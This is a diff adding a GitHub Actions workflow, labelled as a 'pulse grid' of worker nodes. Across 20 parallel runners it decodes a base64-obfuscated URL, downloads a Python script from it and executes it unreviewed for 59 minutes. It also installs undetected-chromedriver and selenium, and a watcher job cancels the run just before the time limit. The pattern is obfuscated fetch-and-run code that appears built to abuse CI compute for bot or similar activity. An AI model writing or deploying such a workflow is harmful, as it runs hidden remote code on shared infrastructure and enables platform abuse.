@@ -1,0 +1,103 @@
+name: System Core Pulse Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: pulse-grid-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watcher: waits 59 minutes then cancels the entire workflow run
+  # =================================================================
+  grid-watcher:
+    name: "System Watcher"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHER_PERIOD: 3540
+    steps:
+      - name: Initialize Watcher
+        run: |
+          echo "[WATCHER] Watcher active for execution: ${{ github.run_id }}"
+          echo "[WATCHER] Monitoring timer for ${WATCHER_PERIOD} seconds."
+
+          sleep "${WATCHER_PERIOD}"
+
+          echo "[WATCHER] Time window expired — initiating cancellation."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[WATCHER] Cancellation signal sent. All active tasks will be aborted."
+
+  # =================================================================
+  # Worker Grid: parallel execution of worker nodes
+  # =================================================================
+  worker-grid:
+    name: "WorkerNode-${{ matrix.node_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_key: [alpha-7a, beta-3b, gamma-9c, delta-2d, epsilon-5e, zeta-8f, eta-1g, theta-6h, iota-4j, kappa-0k, lambda-7l, mu-3m, nu-9n, xi-2p, omicron-5q, pi-8r, rho-1s, sigma-6t, tau-4u, omega-0v]
+
+    steps:
+      # #################################################################
+      # Stage 1: Setup environment
+      # #################################################################
+      - name: Setup Environment
+        run: |
+          echo "[SETUP] Preparing WorkerNode-${{ matrix.node_key }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # #################################################################
+      # Stage 2: Fetch core binary
+      # #################################################################
+      - name: Fetch Core Binary
+        run: |
+          echo "[FETCH] Downloading core script from remote repository..."
+          BINARY_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$BINARY_URL" -o worker_core.py
+          echo "[FETCH] Core script downloaded successfully."
+
+      # #################################################################
+      # Stage 3: Install dependencies
+      # #################################################################
+      - name: Install Dependencies
+        run: |
+          echo "[DEPS] Installing required Python libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # #################################################################
+      # Stage 4: Execute worker core (59-minute cap)
+      # #################################################################
+      - name: Execute Worker Core
+        run: |
+          echo ">> Starting WorkerNode-${{ matrix.node_key }} process..."
+
+          python3 worker_core.py &
+          PROCESS_PID=$!
+
+          echo ">> Process started. Maximum allowed runtime: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$PROCESS_PID" 2>/dev/null; then
+            echo ">> Time limit reached — terminating worker process."
+            kill -9 "$PROCESS_PID"
+            echo ">> Process terminated by runtime manager."
+          else
+            echo ">> Worker process finished before reaching the time limit."
+          fi
